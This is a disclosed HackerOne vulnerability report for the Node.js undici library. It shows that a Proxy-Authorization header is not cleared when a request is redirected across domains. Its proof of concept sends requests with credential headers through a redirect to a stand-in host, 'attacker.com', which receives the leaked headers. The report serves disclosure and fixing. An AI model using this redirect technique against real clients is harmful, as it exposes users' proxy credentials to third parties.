# Proxy-Authorization header is not cleared in cross-domain redirect in undici

## Report Details
- **Report ID**: 2352957
- **URL**: https://hackerone.com/reports/2352957
- **State**: Closed
- **Severity**: low
- **Submitted**: 2024-02-02T16:09:11.328Z
- **Disclosed**: 2024-03-12T02:17:13.563Z

## Reporter
- **Username**: timon8
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
## Steps To Reproduce:

I read this security advisory https://github.com/nodejs/undici/security/advisories/GHSA-wqq4-5wpv-mx2g.
It only clears authorization and cookie header during cross-domain redirect .
{F3024496}
As such this may lead to accidental leakage of "Proxy-Authorization" to a 3rd-party site.
```nodejs
import { request } from 'undici'
const {
    statusCode,
    headers,
    body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
    maxRedirections: 3,
    headers: {
        "autHorization": 'tes123t',
        "coOkie": "ddd=dddd",
        "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
        'Proxy-Authorization':'xxxxxxxx'
    }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
    console.log('data', data)
}
```
{F3024501}


You can refer to this python code.
https://github.com/psf/requests/blob/main/src/requests/sessions.py#L318

References
https://github.com/psf/requests/issues/1885
https://fetch.spec.whatwg.org/#authentication-entries

## Impact

undici v6.5.0

## Attachments
- image.png
- image.png
